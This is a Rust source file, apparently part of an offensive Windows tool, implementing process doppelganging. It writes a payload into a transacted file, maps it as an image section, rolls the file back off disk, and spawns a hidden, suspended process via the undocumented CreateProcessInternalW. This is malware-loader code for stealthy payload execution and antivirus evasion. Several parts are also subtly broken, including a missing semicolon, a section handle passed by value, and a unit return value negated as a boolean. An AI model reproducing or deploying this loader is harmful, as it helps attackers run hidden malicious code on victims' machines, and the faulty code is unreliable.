#![no_std]

extern crate alloc;

use core::mem::{transmute, zeroed};
use core::ptr::null_mut;
use ntapi::ntmmapi::NtCreateSection;
use ntapi::winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
use utils::WideString;
use windows_sys::core::{PCWSTR, PWSTR};
use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_SUCCESS};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateTransaction, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};

type CreateProcessInternalWFn = unsafe extern "system" fn(
    h_token: HANDLE,
    application_name: PCWSTR,
    command_line: PWSTR,
    process_attributes: *mut SECURITY_ATTRIBUTES,
    thread_attributes: *mut SECURITY_ATTRIBUTES,
    inherit_handles: BOOL,
    creation_flags: u32,
    environment: HANDLE,
    current_directory: PCWSTR,
    startup_info: *mut STARTUPINFOW,
    process_information: *mut PROCESS_INFORMATION,
    p_handle: *mut HANDLE,
);

macro_rules! check {
    ($handle:expr) => {
        if $handle == INVALID_HANDLE_VALUE {
            return Err(INVALID_HANDLE_VALUE as _);
        }
    };
}

macro_rules! proc {
    ($module:expr, $func:expr, $type:ty) => {{
        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        use core::intrinsics::transmute;

        let h_module = unsafe {
            GetModuleHandleA(concat!($module, "\0").as_bytes().as_ptr() as _)
        }

        if h_module.is_null() {
            panic!("Couldn't get module handle for module {}", stringify!($module));
        }

        unsafe {
            transmute::<_, $type>(
                GetProcAddress(
                    h_module,
                    concat!($func, "\0").as_bytes().as_ptr() as _,
                )
            )
        }
    }};
}

pub fn make_transacted_section<S>(dummy_name: S, payload: &[u8]) -> Result<HANDLE, i32>
where
    S: AsRef<str>
{
    let dummy_name = dummy_name.as_ref().to_wide();

    let options = 0u32;
    let isolation_lvl = 0u32;
    let isolation_flags = 0u32;
    let timeout = 0u32;

    let transaction = unsafe {
        CreateTransaction(
            null_mut(),
            null_mut(),
            options,
            isolation_lvl,
            isolation_flags,
            timeout,
            null_mut()
        )
    };

    check!(transaction);

    let transacted_file = unsafe {
        CreateFileTransactedW(
            dummy_name.as_ptr(),
            GENERIC_WRITE | GENERIC_READ,
            0,
            null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
            transaction,
            null_mut(),
            null_mut()
        )
    };

    check!(transacted_file);

    let mut written_len = 0;
    if unsafe {
        WriteFile(
            transacted_file,
            payload.as_ptr() as _,
            payload.len() as _,
            &mut written_len,
            null_mut()
        )
    } == FALSE {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    let section: HANDLE = null_mut();
    if unsafe {
        NtCreateSection(
            section as _,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            transacted_file as _
        )
    } != STATUS_SUCCESS {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    unsafe {
        CloseHandle(transacted_file)
    }

    if unsafe {
        RollbackTransaction(transaction)
    } == FALSE {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    unsafe {
        CloseHandle(transaction)
    }

    Ok(section)
}

pub fn create_new_process_internal<S>(cmd_line: S, start_dir: S) -> Option<PROCESS_INFORMATION>
where
    S: AsRef<str>
{
    let cmd_line = cmd_line.as_ref().to_wide();
    let start_dir = start_dir.as_ref().to_wide();

    let mut si = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as _,
        ..unsafe { zeroed() }
    };

    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let token: HANDLE = null_mut();
    let mut new_token: HANDLE = null_mut();

    let create_process_internal = proc!("kernel32", "CreateProcessInternalW", CreateProcessInternalWFn);

    if !create_process_internal(
        token,
        null_mut(),
        cmd_line.as_ptr() as _,
        null_mut(),
        null_mut(),
        FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
        null_mut(),
        start_dir.as_ptr() as _,
        &mut si,
        &mut pi,
        &mut new_token,
    ) {
        return None;
    }

    Some(pi)
}